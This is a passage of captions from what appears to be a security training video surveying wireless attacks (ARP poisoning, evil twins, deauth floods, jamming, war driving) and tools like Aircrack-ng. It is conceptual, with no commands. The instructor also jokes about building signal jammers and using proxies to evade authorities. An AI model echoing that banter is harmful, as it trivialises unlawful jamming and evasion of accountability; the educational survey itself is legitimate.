--> 00:08:52.260\nYou know bit flipping attacks,\nradius replay.\n\n179\n00:08:52.260 --> 00:08:55.840\nDealing with arp and manipulating\narp we've shown you how to do that.\n\n180\n00:08:55.840 --> 00:08:59.130\nI did some arp attacks in one\nof the prior demos for you.\n\n181\n00:08:59.130 --> 00:09:00.650\nWe did that nice arp flood.\n\n182\n00:09:00.650 --> 00:09:01.780\nTook our sin flood rather.\n\n183\n00:09:01.780 --> 00:09:04.210\nBut we did arp attacks as well with kain.\n\n184\n00:09:04.210 --> 00:09:05.040\nWireless network.\n\n185\n00:09:05.040 --> 00:09:07.620\nViruses, people don't realize\nwe could probably get viruses\n\n186\n00:09:07.620 --> 00:09:10.910\nacross wireless interfaces,\njust like we do on wired interfaces.\n\n187\n00:09:10.910 --> 00:09:12.255\nI have that conversation sometimes.\n\n188\n00:09:12.255 --> 00:09:14.310\nWhat do you mean I can get\na virus when I'm on wireless?\n\n189\n00:09:14.310 --> 00:09:16.880\nWell, what do you mean you can't?\n\n190\n00:09:16.880 --> 00:09:20.050\nHow does that not compute for you?\n\n191\n00:09:20.050 --> 00:09:22.460\nDo you get sick when you travel on\na plane and people are sneezing and\n\n192\n00:09:22.460 --> 00:09:24.150\nbreathing recycled air for five hours?\n\n193\n00:09:24.150 --> 00:09:25.360\nSometimes, you do, right?\n\n194\n00:09:25.360 --> 00:09:28.475\nWell It's basically the same thing,\ncuz it's wireless transmission.\n\n195\n00:09:28.475 --> 00:09:29.980\n&gt;&gt; Mm-hm.\n&gt;&gt; If you want somebody to sit next to you\n\n196\n00:09:29.980 --> 00:09:31.040\nand sneeze on you directly,\n\n197\n00:09:31.040 --> 00:09:33.650\nwhile they're holding your hand,\nit would be a wired transmission.\n\n198\n00:09:33.650 --> 00:09:35.160\n&gt;&gt; [LAUGH]\n&gt;&gt; But it's essentially the same\n\n199\n00:09:35.160 --> 00:09:35.720\nidea, right?\n\n200\n00:09:35.720 --> 00:09:37.660\nSo I mean, it works the same way.\n\n201\n00:09:37.660 --> 00:09:38.340\nWhy?\n\n202\n00:09:38.340 --> 00:09:40.010\nWell, think about the logic of that.\n\n203\n00:09:40.010 --> 00:09:42.740\nPeople say this stuff to me sometimes and\nI don't wanna be rude.\n\n204\n00:09:42.740 --> 00:09:46.060\nI mean I understand you're genuinely,\nyou don't know and your asking, obviously,\n\n205\n00:09:46.060 --> 00:09:47.360\nlegitimately and you want an explanation.\n\n206\n00:09:47.360 --> 00:09:50.610\nI'm fine with that but\nI just, I wonder sometimes.\n\n207\n00:09:50.610 --> 00:09:54.240\nI marvel, I step back and I think\ninternally, this is the internal dialog.\n\n208\n00:09:54.240 --> 00:09:56.320\nThe dialog you don't escaping right?\n\n209\n00:09:56.320 --> 00:09:59.970\nBut I think to myself sometimes,\nagain, you don't know about this so\n\n210\n00:09:59.970 --> 00:10:00.650\nit's good to ask.\n\n211\n00:10:00.650 --> 00:10:02.030\nI mean let's get that out on the table.\n\n212\n00:10:02.030 --> 00:10:02.540\nLet's talk about it.\n\n213\n00:10:02.540 --> 00:10:04.340\nLet's make sure you are knowledgable.\n\n214\n00:10:04.340 --> 00:10:05.640\nSo that you have the right information.\n\n215\n00:10:05.640 --> 00:10:06.620\nSo going forward you do know.\n\n216\n00:10:06.620 --> 00:10:08.330\nAnd I mean, that's really important.\n\n217\n00:10:08.330 --> 00:10:09.920\nAnd I'm glad people ask.\n\n218\n00:10:09.920 --> 00:10:11.770\nBut then at some point\nafterwards I reflect on that.\n\n219\n00:10:11.770 --> 00:10:15.593\nI stop and I think and I say to myself,\nknowledge is a powerful thing, and\n\n220\n00:10:15.593 --> 00:10:18.980\njust the lack of knowledge is not\nsomething we should frown on and\n\n221\n00:10:18.980 --> 00:10:20.319\nmake fun of by any means.\n\n222\n00:10:20.319 --> 00:10:23.186\nIt's something we have to go out and\nreally try to address through training and\n\n223\n00:10:23.186 --> 00:10:24.282\nawareness and those things.\n\n224\n00:10:24.282 --> 00:10:27.690\nBut it's just not the lack of\nknowledge that astounds me.\n\n225\n00:10:27.690 --> 00:10:32.800\nBut the fact that people will\ngo through life doing things and\n\n226\n00:10:32.800 --> 00:10:37.580\ntaking for granted the things that they\nreally just don't have knowledge of and\n\n227\n00:10:37.580 --> 00:10:38.850\nassume won't hurt them.\n\n228\n00:10:38.850 --> 00:10:41.330\nThat I get astounded by more\nthan anything else because\n\n229\n00:10:41.330 --> 00:10:43.160\nI want people to know this stuff.\n\n230\n00:10:43.160 --> 00:10:44.050\nI want them to be educated.\n\n231\n00:10:44.050 --> 00:10:47.270\nI want them to understand there is danger\nand that they have to act accordingly.\n\n232\n00:10:47.270 --> 00:10:50.750\nBut that they can be safe and\nsecure if they act responsibly and\n\n233\n00:10:50.750 --> 00:10:51.840\nact the right way.\n\n234\n00:10:51.840 --> 00:10:55.160\nBut I'm just amazed sometimes at the lack,\nI guess, of knowledge and\n\n235\n00:10:55.160 --> 00:10:57.700\nawareness that exists,\nis probably a good way of putting that.\n\n236\n00:10:57.700 --> 00:10:59.590\nBecause we never, ever wanna, obviously,\n\n237\n00:10:59.590 --> 00:11:01.622\ndeny people the opportunity\nto understand things better.\n\n238\n00:11:01.622 --> 00:11:04.320\nThat's always a very critical thing we do,\nhave security professionals,\n\n239\n00:11:04.320 --> 00:11:07.150\nwe have to take that responsibility\nincredibly seriously and\n\n240\n00:11:07.150 --> 00:11:11.280\nreally act honorably and ethically in just\nto be able to make sure that we do put\n\n241\n00:11:11.280 --> 00:11:13.970\ngood information out there\nthat people can benefit from.\n\n242\n00:11:13.970 --> 00:11:17.840\nBut we also have to step back and just\nunderstand that the depth sometimes of\n\n243\n00:11:17.840 --> 00:11:21.840\nthat unawareness can be deeper than what\nwe actually perhaps, or assume or think.\n\n244\n00:11:21.840 --> 00:11:23.430\nAnd so it's just, you know,\na wake-up call for\n\n245\n00:11:23.430 --> 00:11:26.040\nus, as security professionals\nto be aware of that.\n\n246\n00:11:26.040 --> 00:11:30.140\nSome confidentiality tacks,\neaves dropping always a big deal.\n\n247\n00:11:30.140 --> 00:11:32.820\nA honey pot access point,\nso rogue access points,\n\n248\n00:11:32.820 --> 00:11:35.870\nhoney pot access points sometimes\nare intermingle, commingle.\n\n249\n00:11:35.870 --> 00:11:38.850\nEssentially, come or concept, or\nsetting up fake access points,\n\n250\n00:11:38.850 --> 00:11:40.710\ntrying to draw you in on purpose.\n\n251\n00:11:40.710 --> 00:11:43.810\nSession hijacking,\ncracking of web keys as we talked about.\n\n252\n00:11:43.810 --> 00:11:46.440\nMasquerading, I love evil twin APs,\n&gt;&gt; [LAUGH]\n\n253\n00:11:46.440 --> 00:11:49.890\n&gt;&gt; So the cloning of the access point.\n\n254\n00:11:49.890 --> 00:11:51.250\nI'm the good twin, no I'm the bad twin.\n\n255\n00:11:51.250 --> 00:11:53.600\nYou ever see the animated movie, Wizards?\n\n256\n00:11:53.600 --> 00:11:54.400\n&gt;&gt; No.\n&gt;&gt; I think I've talked about\n\n257\n00:11:54.400 --> 00:11:55.490\nthis with you before.\n\n258\n00:11:55.490 --> 00:11:57.650\nRalph Bakshi who did Heavy Metal.\n\n259\n00:11:57.650 --> 00:11:58.880\n&gt;&gt; Yes, I've seen that.\n\n260\n00:11:58.880 --> 00:11:59.760\n&gt;&gt; You saw Heavy Metal, right?\n\n261\n00:11:59.760 --> 00:12:00.770\nSo same animator.\n\n262\n00:12:00.770 --> 00:12:04.110\nIt had wizards, awesome movie.\n\n263\n00:12:04.110 --> 00:12:06.370\nBattle classic concept, between good and\n\n264\n00:12:06.370 --> 00:12:11.310\nevil, it is like Tolkien-esque but\nnot Tolkien, but it's similar concept.\n\n265\n00:12:11.310 --> 00:12:14.970\nYou got this mythical land, you've got the\nforces of good and evil battling it out,\n\n266\n00:12:14.970 --> 00:12:16.209\nit's all drawn and animated.\n\n267\n00:12:17.300 --> 00:12:21.810\nIt's just awesome not to spoil it for\nanybody if you haven't seen it,\n\n268\n00:12:21.810 --> 00:12:26.703\nit's not just that the whole landscape\nit's actually about he brings in and\n\n269\n00:12:26.703 --> 00:12:31.365\ncomments on war through the use of\nthe second world war he has footage from\n\n270\n00:12:31.365 --> 00:12:34.605\nthe Nazis overtaking Poland and\nstuff like that.\n\n271\n00:12:34.605 --> 00:12:36.778\nAnd all this great stuff\nthat's in there and\n\n272\n00:12:36.778 --> 00:12:40.596\nit's really cool it's about a 90 minute\nfilm, you can find it online, and\n\n273\n00:12:40.596 --> 00:12:43.780\nyou could probably find it\nthese days just about anywhere.\n\n274\n00:12:43.780 --> 00:12:47.480\nBut these kind of things are really cool,\nso man in the middle attacks, right?\n\n275\n00:12:47.480 --> 00:12:49.910\nWe talked about MITMs,\nwe'll take a look at that.\n\n276\n00:12:49.910 --> 00:12:53.270\nThese all fall under\nthe confidentiality attack concept or\n\n277\n00:12:53.270 --> 00:12:55.670\narea availability attacks.\n\n278\n00:12:55.670 --> 00:12:58.710\nTheft of access points, turning them off.\n\n279\n00:12:58.710 --> 00:13:00.420\nSingle point of failure kind of things.\n\n280\n00:13:00.420 --> 00:13:02.170\nDenial of service, we've talked about DOS,\n\n281\n00:13:02.170 --> 00:13:05.690\nDDOS, a little bit in that\nwhole set of episodes.\n\n282\n00:13:05.690 --> 00:13:08.230\nAuthentication floods,\nyou saw me do a SIN flood.\n\n283\n00:13:08.230 --> 00:13:09.550\nAn ICMP flood.\n\n284\n00:13:09.550 --> 00:13:12.120\nWe took a look at how that\ncould knock a system offline.\n\n285\n00:13:12.120 --> 00:13:13.070\nArp cache poisoning.\n\n286\n00:13:13.070 --> 00:13:14.830\nI showed you how to execute that and\ndo that.\n\n287\n00:13:15.860 --> 00:13:17.960\nYour tkip mic exploits.\n\n288\n00:13:17.960 --> 00:13:20.370\nYou can go in and\nmanipulate that kind of stuff.\n\n289\n00:13:20.370 --> 00:13:23.710\nBeacon flooding, routing attacks,\ndeauthentication flooding.\n\n290\n00:13:23.710 --> 00:13:27.287\nAll these are in, you know,\nattacks potentially against availability,\n\n291\n00:13:27.287 --> 00:13:29.686\nthat we want to be aware of and\nunderstand as well.\n\n292\n00:13:29.686 --> 00:13:33.816\nYou know, these categories are just\nreplete and ripe with all sorts of\n\n293\n00:13:33.816 --> 00:13:38.300\ndifferent potential approaches and\nwe always want to be sensitive to them.\n\n294\n00:13:38.300 --> 00:13:40.670\nThe idea of misassociation is a big one,\n\n295\n00:13:40.670 --> 00:13:43.850\nyou think you're logging in to the access\npoint when in fact you're not.\n\n296\n00:13:43.850 --> 00:13:46.752\nWe use this a lot with pineapples.\n\n297\n00:13:46.752 --> 00:13:50.413\nYou familiar with the concept of the fake\nworld or the fake cell towers that\n\n298\n00:13:50.413 --> 00:13:54.250\nare being used to get people to associate\nso we can track them and see where they\n\n299\n00:13:54.250 --> 00:13:58.211\nare so client misassociation through\nmisrepresentation of the access point or\n\n300\n00:13:58.211 --> 00:14:01.729\nthe association point can be done if\nyou have that kind of capability.\n\n301\n00:14:01.729 --> 00:14:04.153\nYeah, I wanna have the resources\nwhere I can go up in a helicopter,\n\n302\n00:14:04.153 --> 00:14:05.500\nhover over an urban area,\n&gt;&gt; [LAUGH]\n\n303\n00:14:05.500 --> 00:14:07.232\n&gt;&gt; Have my $40,000 little toy\n\n304\n00:14:07.232 --> 00:14:08.366\nsitting on the seat and\n\n305\n00:14:08.366 --> 00:14:12.350\nthen just start grabbing people's cell\nphones to find out where they are.\n\n306\n00:14:12.350 --> 00:14:13.290\n&gt;&gt; Would be the life, wouldn't it?\n\n307\n00:14:13.290 --> 00:14:14.490\n&gt;&gt; That would be, yeah.\n\n308\n00:14:14.490 --> 00:14:17.764\nI would use that to get around and\nnot do that, but it would the life.\n\n309\n00:14:17.764 --> 00:14:19.120\n&gt;&gt; [LAUGH]\n&gt;&gt; That would just be like the cover,\n\n310\n00:14:19.120 --> 00:14:21.180\nlike yeah we're up doing\nthe pineapple thing today.\n\n311\n00:14:21.180 --> 00:14:23.330\nBut really I'm commuting to Starbuck's,\n&gt;&gt; [LAUGH]\n\n312\n00:14:23.330 --> 00:14:24.950\n&gt;&gt; Or getting coffee, I'm you know,\n\n313\n00:14:24.950 --> 00:14:25.860\ndoing Lord knows what.\n\n314\n00:14:25.860 --> 00:14:27.990\nBut hey let's go fly over over there and\nsee what there doing, and\n\n315\n00:14:27.990 --> 00:14:28.790\nsee what Mike's up to.\n\n316\n00:14:28.790 --> 00:14:33.330\nLand on the roof and\nthat'll be what I'm doing I'm just\n\n317\n00:14:33.330 --> 00:14:38.378\ngonna misuse that totally blow\nthe budget but it would be kinda cool.\n\n318\n00:14:38.378 --> 00:14:42.710\nSerious to think about the kind of stuff,\nobviously misconfigured APs unauthorized\n\n319\n00:14:42.710 --> 00:14:46.322\naccess all these kind of stuff can be\na problem we have to consider that.\n\n320\n00:14:46.322 --> 00:14:48.360\nWe have Mac spoofing as I mentioned and\n\n321\n00:14:48.360 --> 00:14:51.600\nI was first attacks where we\njust suck up the resources.\n\n322\n00:14:51.600 --> 00:14:56.697\nWe can actually use jamming signal attacks\nwhere we jam the wireless signals and\n\n323\n00:14:56.697 --> 00:14:58.834\npropagate a cancellation wave.\n\n324\n00:14:58.834 --> 00:15:02.117\nSo it's almost like white noise we\noverride it so in effect we are not\n\n325\n00:15:02.117 --> 00:15:05.571\nallowing you to do it, which is kind\nof cool cuz we do have hardware based\n\n326\n00:15:05.571 --> 00:15:09.190\nwireless jammers so we wanna walk\naround with like the jammer backpack.\n\n327\n00:15:09.190 --> 00:15:13.460\nSo you've got like the big backpack with\nthe huge antenna coming out the back and\n\n328\n00:15:13.460 --> 00:15:15.860\nyou're walking around and everywhere\nyou go people's phones shut off.\n\n329\n00:15:15.860 --> 00:15:18.370\n&gt;&gt; That might be fun in a public\nplace see how many people stop,\n\n330\n00:15:18.370 --> 00:15:21.560\nstart looking at their phone,\nshake it, you know.\n\n331\n00:15:21.560 --> 00:15:22.640\n&gt;&gt; Yeah, that's kinda cool except for\n\n332\n00:15:22.640 --> 00:15:25.720\nthe fact that you're radiating everything\naround you so by the time you're\n\n333\n00:15:25.720 --> 00:15:30.420\ndone you would glow the cover of my shirt\nmost likely because you basically have,\n\n334\n00:15:30.420 --> 00:15:34.420\nlike in Ghostbusters the unrestricted\nnuclear plant sitting on your back that's\n\n335\n00:15:34.420 --> 00:15:37.950\nnot regulated to generate that\nkind of signal interference.\n\n336\n00:15:37.950 --> 00:15:41.590\nThat would be cool until everybody around\nyou just died from radiation poisoning.\n\n337\n00:15:41.590 --> 00:15:42.980\nThen it wouldn't be so cool.\n\n338\n00:15:42.980 --> 00:15:45.720\nSo we could do that but that would\nobviously be something to consider.\n\n339\n00:15:45.720 --> 00:15:48.518\nAll kidding aside, we do have mobile\njamming units that are either,\n\n340\n00:15:48.518 --> 00:15:51.800\nliterally they are backpack based you\ncan see them, they're briefcase based,\n\n341\n00:15:51.800 --> 00:15:53.505\nthey are fixed asset units you can mount.\n\n342\n00:15:53.505 --> 00:15:56.132\nThey have them in trucks, so\nyou can even drive around and\n\n343\n00:15:56.132 --> 00:15:59.057\nsetup literally a signal barrier\nwhere you jam an entire area.\n\n344\n00:15:59.057 --> 00:16:00.048\nThey use them for all sorts of stuff.\n\n345\n00:16:00.048 --> 00:16:03.973\nThe military uses them for secure\ncommunication, and to obviously interrupt\n\n346\n00:16:03.973 --> 00:16:07.551\nsecure communications on the other side,\nso they can stealth things.\n\n347\n00:16:07.551 --> 00:16:09.490\nAnd so, there's all these\ndifferent ways to do it, but\n\n348\n00:16:09.490 --> 00:16:10.657\nthey're kinda fun to play with.\n\n349\n00:16:10.657 --> 00:16:11.715\nAnd you can actually build your own,\n\n350\n00:16:11.715 --> 00:16:12.523\nbelieve it or not-\n&gt;&gt; Yeah,\n\n351\n00:16:12.523 --> 00:16:14.096\nI wouldn't think it'd be that difficult.\n\n352\n00:16:14.096 --> 00:16:16.154\n&gt;&gt; You can get plans for them on the web,\nit's not that hard to figure out.\n\n353\n00:16:16.154 --> 00:16:18.591\nJust remember when the gentlemen\nin black suits show up, just say,\n\n354\n00:16:18.591 --> 00:16:20.149\nI don't know what you're talking about.\n\n355\n00:16:20.149 --> 00:16:21.922\n&gt;&gt; [LAUGH]\n&gt;&gt; There's no knowledge of that, sir.\n\n356\n00:16:21.922 --> 00:16:23.020\nIt was not me, right?\n\n357\n00:16:23.020 --> 00:16:26.670\nRemember the importance of proxies,\nright, just remember that.\n\n358\n00:16:26.670 --> 00:16:29.960\nAll right, so footprinting the wireless\nnetwork, very important to consider.\n\n359\n00:16:29.960 --> 00:16:32.270\nWe talked a lot about\nfootprinting in prior episodes,\n\n360\n00:16:32.270 --> 00:16:35.950\ndoing the initial layout and\nfeel for the network.\n\n361\n00:16:35.950 --> 00:16:38.780\nGetting the map, if you will,\ncreating the view of the network so\n\n362\n00:16:38.780 --> 00:16:39.720\nwe understand what's going on.\n\n363\n00:16:39.720 --> 00:16:41.860\nWe can do passive or active footprinting.\n\n364\n00:16:41.860 --> 00:16:46.510\nWe can go in and just detect\nthe existence of an AP passively.\n\n365\n00:16:46.510 --> 00:16:48.360\nOr we can actively go out and\nattempt to connect and\n\n366\n00:16:48.360 --> 00:16:49.650\ntry to find out what's happening there.\n\n367\n00:16:49.650 --> 00:16:51.560\nSo, wanna understand that.\n\n368\n00:16:51.560 --> 00:16:52.780\nWe can obviously go out and\n\n369\n00:16:52.780 --> 00:16:56.940\nlook for wireless networks to attack using\na variety of mechanisms and methods.\n\n370\n00:16:56.940 --> 00:16:59.555\nI mentioned wireless site\nsurveys walking around.\n\n371\n00:16:59.555 --> 00:17:01.740\nLiterally, I could do this with my laptop.\n\n372\n00:17:01.740 --> 00:17:03.200\nI mentioned I can do it with my phone.\n\n373\n00:17:04.380 --> 00:17:06.140\nYet another reason why\nBlackBerries are awesome and\n\n374\n00:17:06.140 --> 00:17:08.172\nthe rest of those phones,\nthey all suck, right?\n\n375\n00:17:08.172 --> 00:17:09.890\n&gt;&gt; [LAUGH]\n&gt;&gt; But, you could do this on any phone,\n\n376\n00:17:09.890 --> 00:17:10.511\nI'm only kidding.\n\n377\n00:17:10.511 --> 00:17:14.550\nYou can do it with any phone, we have apps\nfor this on just about any platform today.\n\n378\n00:17:14.550 --> 00:17:17.340\nBut I have an app on my BlackBerry\nthat lets me do this as well.\n\n379\n00:17:17.340 --> 00:17:19.881\nI can walk around, and\nyou don't need a special app.\n\n380\n00:17:19.881 --> 00:17:23.150\nI mean, I have a built-in app that just\nshows me all the wireless access points,\n\n381\n00:17:23.150 --> 00:17:24.895\nbut I have other apps\nthat I can use as well.\n\n382\n00:17:24.895 --> 00:17:27.027\nBut you can just walk around and\nliterally,\n\n383\n00:17:27.027 --> 00:17:28.761\ninformally just do a quick survey.\n\n384\n00:17:28.761 --> 00:17:31.668\nWhen I show up in Client Site,\none of the first things I do is check for\n\n385\n00:17:31.668 --> 00:17:33.249\nwireless to see if I can connect, and\n\n386\n00:17:33.249 --> 00:17:36.423\nif they have an open one versus one that\nI may need the SSID for or whatever.\n\n387\n00:17:36.423 --> 00:17:37.845\nAnd so it's not hard to do.\n\n388\n00:17:37.845 --> 00:17:40.236\nI mean,\npeople over-complicate this stuff and\n\n389\n00:17:40.236 --> 00:17:42.694\nsay you need the $25,000 Fluke analyzer.\n\n390\n00:17:42.694 --> 00:17:46.470\nNo, you just need to have a smartphone and\nbe able to walk.\n\n391\n00:17:46.470 --> 00:17:47.230\n&gt;&gt; Yeah.\n\n392\n00:17:47.230 --> 00:17:48.209\n[LAUGH]\n&gt;&gt; If you can walk and\n\n393\n00:17:48.209 --> 00:17:51.110\nchew gum at the same time,\nyou too can do a wireless site survey.\n\n394\n00:17:51.110 --> 00:17:53.880\nAnd you could find wireless\nnumbers passively or actively, and\n\n395\n00:17:53.880 --> 00:17:54.630\nyou could figure it out.\n\n396\n00:17:54.630 --> 00:17:55.998\nSo, just be aware of that.\n\n397\n00:17:55.998 --> 00:17:59.212\nI mean the Fluke network analyzer's really\ncool, and there's a lot of value in that,\n\n398\n00:17:59.212 --> 00:18:00.500\nbut you don't need that, right?\n\n399\n00:18:00.500 --> 00:18:02.820\nIt's just, what do they say?\n\n400\n00:18:02.820 --> 00:18:04.735\nBoys with toys, or\nwhatever [CROSSTALK] the saying is, right?\n\n401\n00:18:04.735 --> 00:18:05.400\n&gt;&gt; That's it.\n\n402\n00:18:05.400 --> 00:18:06.933\n&gt;&gt; He who dies with the best toys wins?\n\n403\n00:18:06.933 --> 00:18:08.201\n&gt;&gt; That's the one that wins.\n\n404\n00:18:08.201 --> 00:18:11.874\n&gt;&gt; All right, also don't underestimate the\nidea of mapping, laying out the network,\n\n405\n00:18:11.874 --> 00:18:12.850\nbut also GPS mapping.\n\n406\n00:18:12.850 --> 00:18:15.890\nA lot of times you have these\nwireless devices that are on.\n\n407\n00:18:15.890 --> 00:18:19.460\nWe do have location services today\nin all the cell systems, and\n\n408\n00:18:19.460 --> 00:18:23.330\neverything is essentially sending out and\nbroadcasting, right, their location.\n\n409\n00:18:23.330 --> 00:18:27.748\nYou see this on these TV shows like NCIS\nand CSI and all this all the time, where\n\n410\n00:18:27.748 --> 00:18:32.854\nthey're able to triangulate and locate a\nphone through GPS coordinates and mapping.\n\n411\n00:18:32.854 --> 00:18:37.140\nSo there is software out there you can use\nthat can actually do the GPS mapping for\n\n412\n00:18:37.140 --> 00:18:39.970\nyou, to track the location\nof these systems.\n\n413\n00:18:39.970 --> 00:18:43.850\nI actually have a cool app\non my phone that does this,\n\n414\n00:18:43.850 --> 00:18:47.630\nit shows all the active GPS signals and\ncell sites within the area.\n\n415\n00:18:47.630 --> 00:18:51.720\nAnd I can actually find them and\nI can triangulate and locate around that.\n\n416\n00:18:51.720 --> 00:18:52.890\nSo, it's kinda cool.\n\n417\n00:18:52.890 --> 00:18:54.080\n&gt;&gt; Neat.\n\n418\n00:18:54.080 --> 00:18:57.186\n&gt;&gt; Tools like,\nWiggle is one of them, Skyhook,\n\n419\n00:18:57.186 --> 00:18:59.584\nanother one if you are interested.\n\n420\n00:18:59.584 --> 00:19:03.847\nSkyhook actually does the Wi-Fi\npositioning system location based on\n\n421\n00:19:03.847 --> 00:19:06.412\nthe worldwide database of access points.\n\n422\n00:19:06.412 --> 00:19:09.633\nSo you can go on,\nit's a web-based solution.\n\n423\n00:19:09.633 --> 00:19:12.070\nYou can actually look, and you gotta\nput the little pin and find things.\n\n424\n00:19:12.070 --> 00:19:13.440\nSo, that's kind of a cool one.\n\n425\n00:19:13.440 --> 00:19:15.010\nYou can probably take\na look at that Michael,\n\n426\n00:19:15.010 --> 00:19:17.990\nsee if you can pull that up for you.\n\n427\n00:19:17.990 --> 00:19:21.410\nThere's a Wi-Fi finder,\nthe Wi-Fi hotspot finder.\n\n428\n00:19:21.410 --> 00:19:25.850\nThere's WeFi which is another big one,\nWi-Fi hotspot finder.\n\n429\n00:19:25.850 --> 00:19:28.016\nI mentioned a few of those\nthat I use sometimes,\n\n430\n00:19:28.016 --> 00:19:29.974\nWeFi's one that sometimes you'll find.\n\n431\n00:19:29.974 --> 00:19:34.367\nWe as in W-E, WeFi not Wi, W-I.\n\n432\n00:19:34.367 --> 00:19:37.310\nSo yeah, just some things to\nconsider there obviously.\n\n433\n00:19:37.310 --> 00:19:41.110\nBut you can go out, remember war drive,\nyou can go out and you can war walk,\n\n434\n00:19:41.110 --> 00:19:46.020\nyou can war fly,\nyou can do all sorts of stuff.\n\n435\n00:19:46.020 --> 00:19:49.820\nRemember, we're gonna do traffic analysis,\ncapture those packets, look at them, and\n\n436\n00:19:49.820 --> 00:19:52.730\nunderstand what's going on with them,\nand ultimately try to decrypt them or\n\n437\n00:19:52.730 --> 00:19:53.510\ndo whatever.\n\n438\n00:19:53.510 --> 00:19:56.740\nWe need some sort of scanner that\nwill work both wirelessly and wired.\n\n439\n00:19:56.740 --> 00:20:01.900\nOne of the big issues we have with a lot\nof the scanners in Linux and in virtual\n\n440\n00:20:01.900 --> 00:20:04.610\nenvironments, is that the wireless network\ncards don't initialize the right way.\n\n441\n00:20:04.610 --> 00:20:08.440\nSo it's hard to get them to work\nfrom a wireless perspective.\n\n442\n00:20:08.440 --> 00:20:11.220\nYou need them on a physical machine\nthat's setup with the appropriate\n\n443\n00:20:11.220 --> 00:20:12.285\nreal physical hardware.\n\n444\n00:20:12.285 --> 00:20:13.655\n&gt;&gt; Mm-hm.\n&gt;&gt; It's always been an issue in Linux,\n\n445\n00:20:13.655 --> 00:20:15.743\nis getting those wireless drivers\nto initialize the right way.\n\n446\n00:20:15.743 --> 00:20:17.515\nSo, just some things to think about.\n\n447\n00:20:17.515 --> 00:20:19.746\nBut getting the right wireless card and\n\n448\n00:20:19.746 --> 00:20:23.532\nchip set matchup to get them to\nwork is something to consider.\n\n449\n00:20:23.532 --> 00:20:28.590\nAircrack-ng, KisMAC,\nthese kind of things only work\n\n450\n00:20:28.590 --> 00:20:32.710\nwith selected wireless chip sets, so it's\nhard sometimes to get them to initialize.\n\n451\n00:20:32.710 --> 00:20:35.650\nThese are tools by the way,\njust tools you may or not be aware of.\n\n452\n00:20:35.650 --> 00:20:40.092\nAirPcap is the wireless version\nof LinPcap or WinPcap, so\n\n453\n00:20:40.092 --> 00:20:43.520\nyou need that as the promiscuous driver.\n\n454\n00:20:43.520 --> 00:20:46.130\nYou have a Wi-Fi USB dongle\nthat we actually use\n\n455\n00:20:46.130 --> 00:20:48.530\nwith AirPcap to be able to do that.\n\n456\n00:20:48.530 --> 00:20:50.260\nSo it's just something to consider.\n\n457\n00:20:50.260 --> 00:20:53.704\nWireshark can be leveraged with\nsomething like AirPcap to be able\n\n458\n00:20:53.704 --> 00:20:55.360\nto do wireless captures.\n\n459\n00:20:55.360 --> 00:20:57.940\nSo can Network Chemistry's\nprotocol analyzer, by the way.\n\n460\n00:20:57.940 --> 00:21:00.850\nJust thought I'd throw that out there,\ncuz I did mention that one.\n\n461\n00:21:00.850 --> 00:21:03.300\nOmnipeek is the big one you\noften hear people talk about.\n\n462\n00:21:03.300 --> 00:21:06.610\nThat's the real,\nreal big one that everybody uses.\n\n463\n00:21:06.610 --> 00:21:08.000\nSo yeah, just keep that in mind.\n\n464\n00:21:08.000 --> 00:21:11.980\nWe can do spectrum analysis examining\nWi-Fi radio transmissions in a broad area.\n\n465\n00:21:11.980 --> 00:21:13.840\nWe have software that'll let us do this.\n\n466\n00:21:13.840 --> 00:21:18.520\nWe can then pull down and look at\ncoverage maps and all this kind of stuff.\n\n467\n00:21:18.520 --> 00:21:21.694\nThings like WiFiEagle,\nAirMagnet, WiFi Analyzer,\n\n468\n00:21:21.694 --> 00:21:24.317\nthese are tools that may\nbe used in this area.\n\n469\n00:21:24.317 --> 00:21:26.636\nAgain, this is kind of a specialty,\na sub-specialty.\n\n470\n00:21:26.636 --> 00:21:30.877\nYou may not get into wireless radio\ntransmission analysis unless you're really\n\n471\n00:21:30.877 --> 00:21:32.760\ndoing some highly specific stuff.\n\n472\n00:21:32.760 --> 00:21:34.620\nBut it's good to know that it's out there.\n\n473\n00:21:34.620 --> 00:21:38.530\nAnd we obviously just wanna be\nsensitive to that, be aware of that.\n\n474\n00:21:38.530 --> 00:21:41.686\nAircrack-ng in general,\nis a suite of tools that we can use, so\n\n475\n00:21:41.686 --> 00:21:42.980\nwe often talk about that.\n\n476\n00:21:42.980 --> 00:21:46.680\nWe can reveal hidden SIDs, or\nSSIDs rather, using this tool.\n\n477\n00:21:46.680 --> 00:21:50.030\nIt's a command line tool, so\nit's got all sorts of stuff.\n\n478\n00:21:50.030 --> 00:21:55.320\nIn it there's airdriver-ng, aircloak,\nor airdecloak rather, airdrop, airbase.\n\n479\n00:21:55.320 --> 00:21:56.544\nThese are all ng.\n\n480\n00:21:56.544 --> 00:21:59.756\nAirplay, airgraph, airodump.\n\n481\n00:21:59.756 --> 00:22:01.320\n&gt;&gt; [LAUGH]\n&gt;&gt; There should be 20 tools in the suite.\n\n482\n00:22:01.320 --> 00:22:05.280\nIt's a whole bunch of stuff that runs\nas a detector, packet sniffer, WEP,\n\n483\n00:22:05.280 --> 00:22:09.910\nand cracker, WEP analyzer, the whole\nthing throughout the entire stack.\n\n484\n00:22:09.910 --> 00:22:12.630\nIt runs both under Linux and Windows,\nso you could actually get it for both,\n\n485\n00:22:12.630 --> 00:22:13.540\nwhich is kinda cool.\n\n486\n00:22:13.540 --> 00:22:14.450\n&gt;&gt; Nice.\n&gt;&gt; So yeah, yeah,\n\n487\n00:22:14.450 --> 00:22:15.390\nit's actually a really neat tool.\n\n488\n00:22:15.390 --> 00:22:16.760\nWe use it a lot.\n\n489\n00:22:16.760 --> 00:22:18.550\nSo just keep that in mind, right?\n\n490\n00:22:18.550 --> 00:22:20.500\nWe can do all sorts of\ndifferent things and\n\n491\n00:22:20.500 --> 00:22:24.020\nlaunch a whole bunch of\ndifferent solutions.\n\n492\n00:22:24.020 --> 00:22:26.404\nSpeaking of different solutions,\ndifferent kind of attacks,\n\n493\n00:22:26.404 --> 00:22:28.222\nI know you've been busily\ntrying to find stuff.\n\n494\n00:22:28.222 --> 00:22:31.415\nBut can we switch over to the list for\nman-in-the-middle attack?\n\n495\n00:22:31.415 --> 00:22:32.724\n[CROSSTALK]\n&gt;&gt; Absolutely, yep, yep.\n\n496\n00:22:32.724 --> 00:22:33.224\nFor just a second?\nSo\n\n497\n00:22:33.224 --> 00:22:35.117\nwe've got a little\nMan-in-the Middle attack.\n\n498\n00:22:35.117 --> 00:22:37.736\nCan we go full screen, yeah,\njust so we can see that?\n\n499\n00:22:37.736 --> 00:22:39.811\nYou can see that's, nope, nope, other one.\n\n500\n00:22:39.811 --> 00:22:40.367\nSorry about 